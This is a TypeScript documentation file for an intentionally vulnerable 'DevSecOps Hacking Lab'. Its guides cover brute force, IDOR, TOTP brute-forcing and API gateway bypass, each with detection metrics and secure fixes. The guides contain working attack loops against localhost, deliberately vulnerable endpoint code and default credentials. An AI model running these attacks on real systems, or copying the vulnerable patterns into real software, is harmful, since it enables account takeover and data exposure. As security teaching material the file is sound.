/**
 * Documentation Content
 *
 * All documentation content stored as TypeScript constants for bundle inclusion
 */

export interface DocSection {
  id: string
  title: string
  description: string
  icon: string
  guides: DocGuide[]
}

export interface DocGuide {
  slug: string
  title: string
  description: string
  category: string
  content: DocContent[]
  lastUpdated: string
}

export interface DocContent {
  type: 'heading' | 'paragraph' | 'code' | 'list' | 'warning' | 'info' | 'danger' | 'table'
  content: string | string[] | TableContent
  language?: string
  level?: number // for headings (1-3)
}

export interface TableContent {
  headers: string[]
  rows: string[][]
}

export const DOC_SECTIONS: DocSection[] = [
  {
    id: 'getting-started',
    title: 'Getting Started',
    description: 'Installation, setup, and first steps',
    icon: 'Rocket',
    guides: [
      {
        slug: 'quick-start',
        title: 'Quick Start Guide',
        description: 'Get the DevSecOps Hacking Lab up and running in 5 minutes',
        category: 'getting-started',
        lastUpdated: '2025-11-14',
        content: [
          {
            type: 'heading',
            level: 1,
            content: 'Quick Start Guide',
          },
          {
            type: 'paragraph',
            content: 'Welcome to the DevSecOps Hacking Lab! This guide will help you set up the environment and run your first attack in under 5 minutes.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'Prerequisites',
          },
          {
            type: 'paragraph',
            content: 'Before starting, ensure you have the following installed on your system:',
          },
          {
            type: 'list',
            content: [
              'Docker Desktop (version 20.10 or higher)',
              'Docker Compose (version 2.0 or higher)',
              'Node.js (version 18 or higher) - for frontend development',
              'Git for version control',
              'At least 4GB of available RAM',
              'Ports 8000, 8002, 8080, 9090, 3000, 5002, 6379 available',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'Installation',
          },
          {
            type: 'paragraph',
            content: 'Follow these steps to clone and start the lab environment:',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# Clone the repository
git clone https://github.com/yourusername/DevSecOps-Hacking-Lab.git
cd DevSecOps-Hacking-Lab

# Start all services
docker-compose up -d

# Verify services are running
docker-compose ps`,
          },
          {
            type: 'info',
            content: 'Initial startup may take 2-3 minutes as Docker pulls images and builds containers. Subsequent starts will be much faster.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'Verify Installation',
          },
          {
            type: 'paragraph',
            content: 'Check that all services are healthy:',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# Check service health
curl http://localhost:8000/health  # Auth Service
curl http://localhost:8080/health  # API Gateway
curl http://localhost:8002/health  # User Service
curl http://localhost:5002/health  # Incident Bot

# All should return: {"status": "healthy"}`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Access the Frontend',
          },
          {
            type: 'paragraph',
            content: 'For local development, start the React frontend:',
          },
          {
            type: 'code',
            language: 'bash',
            content: `cd frontend
npm install
npm run dev`,
          },
          {
            type: 'paragraph',
            content: 'Open your browser to http://localhost:5173. You should see the DevSecOps Hacking Lab homepage with a green "Connected" status indicator.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'First Steps',
          },
          {
            type: 'list',
            content: [
              'Navigate to Attack Playground to see available attack scenarios',
              'Click "Authenticate" to get a JWT token (username: admin, password: admin123)',
              'Complete MFA verification using the code from Docker logs',
              'Launch your first attack - try the Brute Force Attack',
              'View real-time metrics in the Monitoring Dashboard',
              'Check Grafana at http://localhost:3000 (admin/admin) for detailed visualizations',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'Default Credentials',
          },
          {
            type: 'warning',
            content: 'These credentials are for the demo environment ONLY. Never use default credentials in production!',
          },
          {
            type: 'table',
            content: {
              headers: ['Service', 'Username', 'Password', 'Notes'],
              rows: [
                ['Auth Service', 'admin', 'admin123', 'MFA enabled (TOTP)'],
                ['Grafana', 'admin', 'admin', 'Change on first login'],
                ['User Service', 'user1', 'password1', 'Vulnerable test account'],
                ['User Service', 'user2', 'password2', 'Vulnerable test account'],
              ],
            },
          },
          {
            type: 'heading',
            level: 2,
            content: 'Next Steps',
          },
          {
            type: 'paragraph',
            content: 'Now that your environment is running, explore these topics:',
          },
          {
            type: 'list',
            content: [
              'Read the Architecture Overview to understand the service mesh',
              'Study individual Attack Guides to learn exploitation techniques',
              'Review Defense & Mitigation strategies to understand security controls',
              'Explore the API Reference for integration examples',
            ],
          },
        ],
      },
      {
        slug: 'architecture',
        title: 'Architecture Overview',
        description: 'Understand the service mesh, technology stack, and data flow',
        category: 'getting-started',
        lastUpdated: '2025-11-14',
        content: [
          {
            type: 'heading',
            level: 1,
            content: 'Architecture Overview',
          },
          {
            type: 'paragraph',
            content: 'The DevSecOps Hacking Lab is built as a microservices architecture with intentionally vulnerable services, security controls, and comprehensive monitoring.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'Service Mesh',
          },
          {
            type: 'code',
            language: 'text',
            content: `Client (Browser/curl)
  ↓
API Gateway (:8080) ← Security Layer
  ├── JWT Validation
  ├── Rate Limiting (60 req/min)
  ├── WAF (SQL injection, XSS, Path traversal)
  └── Security Headers
  ↓
  ├─→ Auth Service (login-api :8000)
  │   ├── JWT Token Generation (5min expiry)
  │   ├── MFA (TOTP) Verification
  │   ├── Token Refresh & Revocation
  │   └── Redis Session Store
  │
  └─→ User Service (:8002) [VULNERABLE]
      ├── User Profile (IDOR vulnerability)
      ├── Settings (No auth bypass)
      └── Direct Access (Gateway bypass)

Monitoring Stack:
  Prometheus (:9090) → Metrics Collection
  Alertmanager (:9093) → Alert Routing
  Incident Bot (:5002) → Automated Response
  Grafana (:3000) → Visualization

Backend:
  Redis (:6379) → Sessions, Rate Limits, IP Bans
  Traefik (:8443) → Reverse Proxy (TLS)`,
          },
          {
            type: 'info',
            content: 'Services are intentionally exposed on public ports to demonstrate "direct access" attacks. In production, only the gateway would be publicly accessible.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'Technology Stack',
          },
          {
            type: 'table',
            content: {
              headers: ['Component', 'Technology', 'Purpose'],
              rows: [
                ['Backend Framework', 'FastAPI (Python 3.11+)', 'High-performance async API services'],
                ['Authentication', 'JWT (HS256) + pyotp (TOTP)', 'Token-based auth with MFA'],
                ['Session Store', 'Redis', 'Distributed session management'],
                ['Monitoring', 'Prometheus + Grafana', 'Metrics collection and visualization'],
                ['Alerting', 'Alertmanager', 'Alert routing and deduplication'],
                ['Frontend', 'React 19 + TypeScript + Vite', 'Modern SPA with static deployment'],
                ['Orchestration', 'Docker Compose', 'Multi-container deployment'],
                ['HTTP Client', 'httpx (async)', 'Service-to-service communication'],
              ],
            },
          },
          {
            type: 'heading',
            level: 2,
            content: 'Port Reference',
          },
          {
            type: 'table',
            content: {
              headers: ['Port', 'Service', 'Purpose', 'Public'],
              rows: [
                ['8000', 'login-api', 'Auth Service (JWT, MFA)', 'Yes (demo only)'],
                ['8002', 'user-service', 'User management (vulnerable)', 'Yes (demo only)'],
                ['8080', 'api-gateway', 'API Gateway (security layer)', 'Yes'],
                ['8443', 'traefik', 'Reverse proxy (HTTPS)', 'Yes'],
                ['9090', 'prometheus', 'Metrics collection', 'Yes (demo only)'],
                ['3000', 'grafana', 'Dashboards', 'Yes'],
                ['9093', 'alertmanager', 'Alert routing', 'Yes (demo only)'],
                ['5002', 'incident-bot', 'Incident response automation', 'Yes (demo only)'],
                ['6379', 'redis', 'Session store', 'No (internal)'],
              ],
            },
          },
          {
            type: 'heading',
            level: 2,
            content: 'Data Flow',
          },
          {
            type: 'paragraph',
            content: 'Typical request flow through the system:',
          },
          {
            type: 'list',
            content: [
              'Client sends request to API Gateway (:8080)',
              'Gateway applies middleware: Logging → Security Headers → Rate Limiting → WAF',
              'If authenticated endpoint, Gateway validates JWT with Auth Service',
              'Gateway forwards request to backend service (Auth or User Service)',
              'Backend service processes request and returns response',
              'Prometheus scrapes /metrics endpoints every 15 seconds',
              'Alertmanager evaluates alert rules and triggers webhooks to Incident Bot',
              'Incident Bot executes runbooks (notify, ban IP, generate report)',
              'Grafana queries Prometheus for dashboard visualization',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'Security Layers',
          },
          {
            type: 'paragraph',
            content: 'The architecture implements defense in depth:',
          },
          {
            type: 'table',
            content: {
              headers: ['Layer', 'Controls', 'Bypass Method (Educational)'],
              rows: [
                ['Network', 'Docker networking', 'Direct service access via exposed ports'],
                ['Gateway', 'JWT validation, Rate limiting, WAF', 'Direct service access'],
                ['Application', 'MFA, Token revocation, Input validation', 'IDOR, Auth bypass on user-service'],
                ['Monitoring', 'Real-time metrics, Alerting', 'Slow attacks under threshold'],
                ['Response', 'Automated IP banning, Incident runbooks', 'IP rotation, Distributed attacks'],
              ],
            },
          },
          {
            type: 'heading',
            level: 2,
            content: 'Intentional Vulnerabilities',
          },
          {
            type: 'danger',
            content: 'These vulnerabilities are INTENTIONAL for educational purposes. Do NOT deploy this lab to production!',
          },
          {
            type: 'list',
            content: [
              'IDOR (Insecure Direct Object Reference) - /profile/{user_id} has no authorization',
              'Auth Bypass - /settings endpoint lacks JWT validation',
              'Direct Service Access - Backend services exposed on public ports',
              'Rate Limit Bypass - Rate limiting only at gateway, not on backend services',
              'Weak MFA - TOTP enumeration possible with time-based brute force',
            ],
          },
        ],
      },
    ],
  },
  {
    id: 'attack-guides',
    title: 'Attack Guides',
    description: 'Step-by-step exploitation techniques',
    icon: 'Target',
    guides: [
      {
        slug: 'brute-force',
        title: 'Brute Force Attack',
        description: 'Password enumeration against authentication endpoint',
        category: 'attack-guides',
        lastUpdated: '2025-11-14',
        content: [
          {
            type: 'heading',
            level: 1,
            content: 'Brute Force Attack',
          },
          {
            type: 'paragraph',
            content: 'A brute force attack attempts to guess valid credentials by trying many username/password combinations. This attack demonstrates rate limiting bypass and automated credential enumeration.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'What is Brute Force?',
          },
          {
            type: 'paragraph',
            content: 'Brute force attacks systematically try all possible combinations of credentials until a valid one is found. They can be:',
          },
          {
            type: 'list',
            content: [
              'Dictionary-based: Using common passwords from wordlists',
              'Credential stuffing: Using leaked credentials from other breaches',
              'Pure brute force: Trying all possible character combinations',
              'Hybrid: Combining dictionary words with common patterns (Password1, Password123)',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'How This Attack Works',
          },
          {
            type: 'paragraph',
            content: 'Our implementation targets the authentication endpoint with a predefined password list:',
          },
          {
            type: 'code',
            language: 'python',
            content: `# Simplified attack flow
passwords = ["admin", "password", "123456", "admin123", ...]

for password in passwords:
    response = requests.post(
        "http://localhost:8000/auth/login",
        json={"username": "admin", "password": password}
    )
    if response.status_code == 200:
        print(f"SUCCESS: Found password: {password}")
        break`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Step-by-Step Execution',
          },
          {
            type: 'paragraph',
            content: 'Using the Attack Playground:',
          },
          {
            type: 'list',
            content: [
              'Navigate to Attack Playground',
              'Find the "Brute Force Attack" card',
              'Click "Launch Attack"',
              'Enter target username (default: admin)',
              'Click "Execute Attack"',
              'Watch real-time logging as passwords are tested',
              'See results showing attempts, success/failure, and time taken',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'Using the Python Script',
          },
          {
            type: 'code',
            language: 'bash',
            content: `cd attacks/brute-force
python brute_force.py --target http://localhost:8000/auth/login --username admin

# Output:
# [*] Starting brute force attack against admin
# [*] Attempting: admin
# [*] Attempting: password
# [*] Attempting: 123456
# [+] SUCCESS! Password found: admin123
# [*] Total attempts: 4 | Time: 2.31s`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Detection in Metrics',
          },
          {
            type: 'paragraph',
            content: 'This attack is visible in multiple metrics:',
          },
          {
            type: 'table',
            content: {
              headers: ['Metric', 'What to Look For', 'Alert Threshold'],
              rows: [
                ['login_attempts_total{status="failure"}', 'Spike in failed logins', '> 10 in 5 minutes'],
                ['gateway_rate_limit_blocks_total', 'Rate limit violations', '> 5 blocks'],
                ['http_requests_total{endpoint="/auth/login"}', 'High request volume', '> 60 per minute'],
              ],
            },
          },
          {
            type: 'heading',
            level: 2,
            content: 'Mitigation Strategies',
          },
          {
            type: 'list',
            content: [
              'Rate Limiting: Limit login attempts (implemented: 60 req/min at gateway)',
              'Account Lockout: Ban IP or account after N failed attempts (implemented: 10 failures = 15min ban)',
              'CAPTCHA: Require human verification after failed attempts',
              'Multi-Factor Authentication: MFA makes brute force impractical (implemented)',
              'Password Policies: Enforce strong, unique passwords',
              'Monitoring: Alert on unusual login patterns (implemented)',
              'Progressive Delays: Increase delay after each failed attempt',
            ],
          },
          {
            type: 'warning',
            content: 'The current implementation has rate limiting at the gateway (60 req/min), but this can be bypassed by attacking the auth service directly on port 8000. This is intentional for demonstration purposes.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'Real-World Impact',
          },
          {
            type: 'paragraph',
            content: 'Successful brute force attacks can lead to:',
          },
          {
            type: 'list',
            content: [
              'Account takeover and unauthorized access',
              'Data breaches if admin accounts are compromised',
              'Lateral movement within the network',
              'Privilege escalation if service accounts are compromised',
              'Compliance violations (GDPR, PCI-DSS)',
            ],
          },
        ],
      },
      {
        slug: 'idor',
        title: 'IDOR Exploitation',
        description: 'Insecure Direct Object Reference vulnerability exploitation',
        category: 'attack-guides',
        lastUpdated: '2025-11-14',
        content: [
          {
            type: 'heading',
            level: 1,
            content: 'IDOR Exploitation',
          },
          {
            type: 'paragraph',
            content: 'Insecure Direct Object Reference (IDOR) occurs when an application provides direct access to objects based on user input without proper authorization checks. Attackers can manipulate parameters to access unauthorized data.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'What is IDOR?',
          },
          {
            type: 'paragraph',
            content: 'IDOR is an access control vulnerability where the application:',
          },
          {
            type: 'list',
            content: [
              'Uses user-supplied input to access objects directly (e.g., user_id, file_id)',
              'Fails to verify that the user is authorized to access the requested object',
              'Allows attackers to bypass authorization by changing parameter values',
              'Exposes data belonging to other users or resources',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'Vulnerable Endpoint',
          },
          {
            type: 'paragraph',
            content: 'The user service has an intentionally vulnerable endpoint:',
          },
          {
            type: 'code',
            language: 'python',
            content: `# Vulnerable endpoint (NO authorization check)
@app.get("/profile/{user_id}")
async def get_user_profile(user_id: str):
    # Missing: Verify current_user is authorized to view user_id
    user = await db.get_user(user_id)
    return user  # Returns ANY user's data!`,
          },
          {
            type: 'danger',
            content: 'This endpoint allows ANY authenticated user to access ANY other user\'s profile by simply changing the user_id parameter!',
          },
          {
            type: 'heading',
            level: 2,
            content: 'How This Attack Works',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# 1. Authenticate as user1
curl -X POST http://localhost:8000/auth/login \\
  -H "Content-Type: application/json" \\
  -d '{"username":"user1","password":"password1"}'

# 2. Access your own profile (legitimate)
curl http://localhost:8002/profile/user1 \\
  -H "Authorization: Bearer <token>"
# Returns: {"user_id":"user1","email":"user1@example.com",...}

# 3. Access another user's profile (IDOR!)
curl http://localhost:8002/profile/admin \\
  -H "Authorization: Bearer <token>"
# Returns: {"user_id":"admin","email":"admin@example.com",...}
# ^^^ This should fail but doesn't - IDOR vulnerability!`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Step-by-Step Execution',
          },
          {
            type: 'list',
            content: [
              'Navigate to Attack Playground',
              'Click "Authenticate" to get a valid JWT token',
              'Find the "IDOR Exploitation" attack card',
              'Click "Launch Attack"',
              'Enter target user IDs to enumerate (admin, user1, user2, etc.)',
              'Execute the attack',
              'View successfully retrieved profiles in the results',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'Detection in Metrics',
          },
          {
            type: 'table',
            content: {
              headers: ['Metric', 'What to Look For', 'Indicator'],
              rows: [
                ['user_service_idor_attempts_total', 'Spike in profile access', 'Multiple different user_id accesses from one IP'],
                ['http_requests_total{endpoint="/profile/*"}', 'Enumeration pattern', 'Sequential user_id requests'],
                ['user_service_profile_access_total', 'Cross-user access', 'User accessing profiles != their own user_id'],
              ],
            },
          },
          {
            type: 'heading',
            level: 2,
            content: 'Secure Implementation',
          },
          {
            type: 'paragraph',
            content: 'How this endpoint SHOULD be implemented:',
          },
          {
            type: 'code',
            language: 'python',
            content: `# Secure endpoint (WITH authorization check)
@app.get("/profile/{user_id}")
async def get_user_profile(
    user_id: str,
    current_user: User = Depends(get_current_user)  # JWT validation
):
    # Authorization check: User can only access their own profile
    if current_user.user_id != user_id:
        # Unless they have admin role
        if "admin" not in current_user.roles:
            raise HTTPException(status_code=403, detail="Access denied")

    user = await db.get_user(user_id)
    return user`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Mitigation Strategies',
          },
          {
            type: 'list',
            content: [
              'Authorization Checks: Verify user is authorized to access the requested resource',
              'Indirect Reference Maps: Use session-specific mappings instead of direct IDs',
              'Access Control Lists: Implement role-based or attribute-based access control',
              'Deny by Default: Require explicit authorization rather than implicit access',
              'Logging & Monitoring: Track cross-user access attempts (metric: user_service_idor_attempts_total)',
              'Use UUIDs: Random IDs instead of sequential integers make enumeration harder',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'Real-World Examples',
          },
          {
            type: 'paragraph',
            content: 'Famous IDOR vulnerabilities:',
          },
          {
            type: 'list',
            content: [
              'Facebook (2013): Access to private photos by manipulating photo IDs',
              'Twitter (2022): Access to 5.4M accounts by enumerating user IDs via API',
              'Instagram (2019): Access to private posts and stories via media IDs',
              'Healthcare systems: Patient records exposed via predictable record IDs',
            ],
          },
          {
            type: 'warning',
            content: 'IDOR is consistently in OWASP Top 10 (A01:2021 - Broken Access Control) and causes massive data breaches when exploited at scale.',
          },
        ],
      },
      {
        slug: 'mfa-bypass',
        title: 'MFA Bypass (Bruteforce)',
        description: 'Time-based TOTP enumeration attack',
        category: 'attack-guides',
        lastUpdated: '2025-11-14',
        content: [
          {
            type: 'heading',
            level: 1,
            content: 'MFA Bypass (Bruteforce)',
          },
          {
            type: 'paragraph',
            content: 'Multi-Factor Authentication (MFA) adds a second layer of security, but TOTP (Time-based One-Time Password) codes can be vulnerable to brute force enumeration if not properly rate-limited.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'TOTP Overview',
          },
          {
            type: 'paragraph',
            content: 'TOTP generates 6-digit codes that change every 30 seconds based on:',
          },
          {
            type: 'list',
            content: [
              'Shared secret (stored on both server and user device)',
              'Current Unix timestamp (divided by 30-second intervals)',
              'HMAC-SHA1 algorithm to generate the code',
            ],
          },
          {
            type: 'code',
            language: 'python',
            content: `# TOTP code generation
import pyotp

secret = "DEVSECOPSTWENTYFOURHACKINGLAB"
totp = pyotp.TOTP(secret, interval=30)
code = totp.now()  # Returns current 6-digit code

# Code is valid for 30 seconds
# Example: "123456" is valid from 12:00:00 to 12:00:30`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'The Vulnerability',
          },
          {
            type: 'paragraph',
            content: 'While TOTP has 1,000,000 possible codes (000000-999999), brute forcing is feasible because:',
          },
          {
            type: 'list',
            content: [
              'Only 6 digits = 1 million combinations',
              'Code is valid for 30 seconds (or 60 with grace period)',
              'No rate limiting on MFA verification endpoint',
              'Time window allows approximately 30 attempts per second',
              'With parallelization: 1M codes ÷ 100 threads ≈ 10K attempts each',
            ],
          },
          {
            type: 'danger',
            content: 'Without rate limiting, an attacker can enumerate all 1 million codes in under 5 minutes with proper parallelization!',
          },
          {
            type: 'heading',
            level: 2,
            content: 'Attack Flow',
          },
          {
            type: 'code',
            language: 'python',
            content: `# Step 1: Get challenge ID from password login
response = requests.post("http://localhost:8000/auth/login",
    json={"username": "admin", "password": "admin123"})
challenge_id = response.json()["challenge_id"]

# Step 2: Brute force TOTP codes
for code in range(0, 1000000):
    totp_code = f"{code:06d}"  # Format as 6 digits: 000000-999999

    response = requests.post("http://localhost:8000/auth/mfa/verify",
        json={"challenge_id": challenge_id, "code": totp_code})

    if response.status_code == 200:
        print(f"SUCCESS! Valid code: {totp_code}")
        print(f"Access token: {response.json()['access_token']}")
        break`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Step-by-Step Execution',
          },
          {
            type: 'list',
            content: [
              'Navigate to Attack Playground',
              'Find "MFA Bypass (Bruteforce)" attack card',
              'Click "Launch Attack"',
              'Enter credentials (admin/admin123)',
              'The attack will automatically obtain challenge_id',
              'Watch as TOTP codes are enumerated (000000-999999)',
              'Attack succeeds when valid code is found within current 30-second window',
              'View JWT tokens in results',
            ],
          },
          {
            type: 'info',
            content: 'This attack typically finds the valid code within 30-60 seconds with parallel enumeration, demonstrating why rate limiting on MFA endpoints is critical.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'Detection Indicators',
          },
          {
            type: 'table',
            content: {
              headers: ['Metric', 'Normal Behavior', 'Attack Pattern'],
              rows: [
                ['mfa_attempts_total{status="failure"}', '1-2 failures (typo)', '100s-1000s of failures'],
                ['http_requests_total{endpoint="/auth/mfa/verify"}', '1-3 requests', '1000+ requests in seconds'],
                ['mfa_verification_duration_seconds', '< 5 seconds', 'Extends for minutes'],
              ],
            },
          },
          {
            type: 'heading',
            level: 2,
            content: 'Mitigation Strategies',
          },
          {
            type: 'list',
            content: [
              'Rate Limiting: Limit MFA attempts to 5-10 per minute per challenge_id',
              'Account Lockout: Ban IP or invalidate challenge_id after 10 failed attempts',
              'Challenge Expiration: Expire challenge_id after 5 minutes',
              'Exponential Backoff: Increase delay after each failed attempt',
              'CAPTCHA: Require human verification after N failures',
              'WebAuthn/FIDO2: Use hardware tokens instead of TOTP (phishing-resistant)',
              'Monitoring: Alert on high MFA failure rates',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'Why This Attack Works',
          },
          {
            type: 'paragraph',
            content: 'The attack succeeds because:',
          },
          {
            type: 'code',
            language: 'python',
            content: `# Vulnerable implementation (NO rate limiting)
@app.post("/auth/mfa/verify")
async def verify_mfa(challenge_id: str, code: str):
    # Missing: Rate limit check
    # Missing: Challenge expiration check
    # Missing: Failed attempt counter

    user = await get_user_from_challenge(challenge_id)
    totp = pyotp.TOTP(user.mfa_secret)

    if totp.verify(code):  # Vulnerable to enumeration!
        return generate_tokens(user)

    # No penalty for failed attempts!
    raise HTTPException(status_code=401, detail="Invalid code")`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Secure Implementation',
          },
          {
            type: 'code',
            language: 'python',
            content: `# Secure implementation (WITH protections)
@app.post("/auth/mfa/verify")
async def verify_mfa(challenge_id: str, code: str, request: Request):
    # 1. Check rate limit (5 attempts per minute)
    attempts = await redis.get(f"mfa_attempts:{challenge_id}")
    if attempts and int(attempts) >= 5:
        raise HTTPException(status_code=429, detail="Too many attempts")

    # 2. Check challenge expiration (5 minutes)
    challenge = await redis.get(f"challenge:{challenge_id}")
    if not challenge or is_expired(challenge, minutes=5):
        raise HTTPException(status_code=400, detail="Challenge expired")

    user = await get_user_from_challenge(challenge_id)
    totp = pyotp.TOTP(user.mfa_secret)

    if totp.verify(code):
        await redis.delete(f"mfa_attempts:{challenge_id}")
        return generate_tokens(user)

    # 3. Increment failure counter
    await redis.incr(f"mfa_attempts:{challenge_id}")
    await redis.expire(f"mfa_attempts:{challenge_id}", 60)

    # 4. Ban after 10 failures
    if int(await redis.get(f"mfa_attempts:{challenge_id}")) >= 10:
        await ban_ip(request.client.host, duration=3600)

    raise HTTPException(status_code=401, detail="Invalid code")`,
          },
          {
            type: 'warning',
            content: 'The current demo implementation has NO rate limiting on MFA verification to demonstrate the vulnerability. Real applications must implement strict rate limits!',
          },
        ],
      },
      {
        slug: 'gateway-bypass',
        title: 'Gateway Bypass (Direct Access)',
        description: 'Bypass API gateway security controls by accessing services directly',
        category: 'attack-guides',
        lastUpdated: '2025-11-14',
        content: [
          {
            type: 'heading',
            level: 1,
            content: 'Gateway Bypass (Direct Access)',
          },
          {
            type: 'paragraph',
            content: 'When backend services are exposed on public ports, attackers can bypass API gateway security controls (JWT validation, rate limiting, WAF) by accessing services directly.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'The Architecture Problem',
          },
          {
            type: 'paragraph',
            content: 'In a typical microservices architecture:',
          },
          {
            type: 'code',
            language: 'text',
            content: `Intended Flow:
Client → API Gateway (:8080) → Backend Service (:8002)
         ↑ Security controls applied here

Bypass Flow:
Client ────────────────────────→ Backend Service (:8002)
         ↑ NO security controls!`,
          },
          {
            type: 'danger',
            content: 'If backend services are accessible on public networks, all gateway security controls are USELESS!',
          },
          {
            type: 'heading',
            level: 2,
            content: 'What Gets Bypassed?',
          },
          {
            type: 'table',
            content: {
              headers: ['Security Control', 'Gateway (:8080)', 'Direct Access (:8002)'],
              rows: [
                ['JWT Validation', 'Enforced', 'BYPASSED'],
                ['Rate Limiting', '60 req/min', 'UNLIMITED'],
                ['WAF (SQL Injection, XSS)', 'Blocked', 'BYPASSED'],
                ['Security Headers', 'Added', 'MISSING'],
                ['Logging', 'Comprehensive', 'Basic only'],
                ['IP Banning', 'Enforced', 'BYPASSED'],
              ],
            },
          },
          {
            type: 'heading',
            level: 2,
            content: 'How This Attack Works',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# 1. Normal flow through gateway (REQUIRES JWT)
curl http://localhost:8080/profile/admin
# Response: 401 Unauthorized - Missing JWT token

# 2. Direct access to user-service (BYPASSES gateway)
curl http://localhost:8002/profile/admin
# Response: 200 OK - Returns profile WITHOUT authentication!

# 3. Bypass rate limiting
for i in {1..1000}; do
  curl http://localhost:8002/profile/user$i &
done
# Gateway would block after 60 requests
# Direct access: ALL 1000 requests succeed!`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Discovery Methods',
          },
          {
            type: 'paragraph',
            content: 'How attackers discover direct service access:',
          },
          {
            type: 'list',
            content: [
              'Port Scanning: nmap, masscan reveal open ports (8000, 8002, etc.)',
              'Error Messages: Stack traces may reveal internal service URLs',
              'Documentation: Accidentally published API docs with internal endpoints',
              'DNS Records: Internal service names in DNS (service.internal.company.com)',
              'GitHub: Leaked docker-compose.yml files showing port mappings',
              'Cloud Metadata: AWS/GCP metadata endpoints revealing internal IPs',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'Step-by-Step Execution',
          },
          {
            type: 'list',
            content: [
              'Navigate to Attack Playground',
              'Find "Gateway Bypass (Direct Access)" attack',
              'Click "Launch Attack"',
              'Choose attack type: Profile Enumeration or Settings Manipulation',
              'Execute attack against port 8002 (bypassing gateway on 8080)',
              'Observe successful requests WITHOUT JWT tokens',
              'Compare with same requests through gateway (would fail)',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'Detection Indicators',
          },
          {
            type: 'table',
            content: {
              headers: ['Indicator', 'Description', 'Metric'],
              rows: [
                ['Request Discrepancy', 'Backend receives more requests than gateway logs', 'Compare http_requests_total'],
                ['Unauthenticated Access', 'Successful requests without JWT', 'user_service_direct_access_total'],
                ['Rate Limit Bypass', 'High request rate without rate limit blocks', 'gateway_rate_limit_blocks_total = 0'],
                ['Port Access Patterns', 'Connections to port 8002 from external IPs', 'Network flow logs'],
              ],
            },
          },
          {
            type: 'heading',
            level: 2,
            content: 'Mitigation Strategies',
          },
          {
            type: 'list',
            content: [
              'Network Segmentation: Backend services on private network, NOT publicly accessible',
              'Firewall Rules: Only allow gateway IP to access backend services',
              'Docker Networking: Use internal networks, no port exposure (ports: vs expose:)',
              'Service Mesh: Use Istio, Linkerd for mutual TLS and traffic management',
              'Defense in Depth: Implement security at EVERY layer, not just gateway',
              'Monitoring: Alert on direct backend access from external IPs',
              'Load Balancer: Frontend load balancer as single entry point',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'Docker Compose Configuration',
          },
          {
            type: 'paragraph',
            content: 'Vulnerable configuration (current demo):',
          },
          {
            type: 'code',
            language: 'yaml',
            content: `# VULNERABLE: Exposes service on host port
user-service:
  ports:
    - "8002:8000"  # Publicly accessible!
  networks:
    - app-network`,
          },
          {
            type: 'paragraph',
            content: 'Secure configuration:',
          },
          {
            type: 'code',
            language: 'yaml',
            content: `# SECURE: Only gateway exposed, backend internal
user-service:
  # Use 'expose' instead of 'ports'
  expose:
    - "8000"  # Only accessible within Docker network
  networks:
    - backend  # Separate network from public gateway

api-gateway:
  ports:
    - "8080:8080"  # Only entry point
  networks:
    - frontend  # Public network
    - backend   # Can access backend services`,
          },
          {
            type: 'warning',
            content: 'In this demo lab, backend services are intentionally exposed to demonstrate the vulnerability. Production deployments must NEVER expose backend services publicly!',
          },
          {
            type: 'heading',
            level: 2,
            content: 'Real-World Impact',
          },
          {
            type: 'paragraph',
            content: 'Gateway bypass vulnerabilities have caused major breaches:',
          },
          {
            type: 'list',
            content: [
              'Capital One (2019): Server-Side Request Forgery (SSRF) bypassed WAF to access AWS metadata',
              'Elasticsearch Instances: Thousands exposed publicly with no authentication (bypassing intended access controls)',
              'MongoDB Databases: Direct access without authentication led to data dumps',
              'Internal APIs: Accidentally exposed microservices allowed complete system compromise',
            ],
          },
        ],
      },
    ],
  },
  {
    id: 'defense',
    title: 'Defense & Mitigation',
    description: 'Security controls and incident response',
    icon: 'Shield',
    guides: [
      {
        slug: 'security-controls',
        title: 'Security Controls Overview',
        description: 'Understanding implemented security mechanisms',
        category: 'defense',
        lastUpdated: '2025-11-14',
        content: [
          {
            type: 'heading',
            level: 1,
            content: 'Security Controls Overview',
          },
          {
            type: 'paragraph',
            content: 'The DevSecOps Hacking Lab implements multiple layers of security controls to demonstrate defense in depth. Understanding how these controls work is essential for both attacking and defending systems.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'Authentication Controls',
          },
          {
            type: 'paragraph',
            content: 'JWT-based authentication with MFA:',
          },
          {
            type: 'table',
            content: {
              headers: ['Control', 'Implementation', 'Bypass Method'],
              rows: [
                ['JWT Tokens', 'HS256 signed, 5min expiry', 'Token replay (before expiry)'],
                ['Refresh Tokens', '60min expiry, stored in Redis', 'Token theft from storage'],
                ['MFA (TOTP)', '6-digit codes, 30sec interval', 'Brute force enumeration'],
                ['Token Revocation', 'Blacklist in Redis', 'Race condition before sync'],
              ],
            },
          },
          {
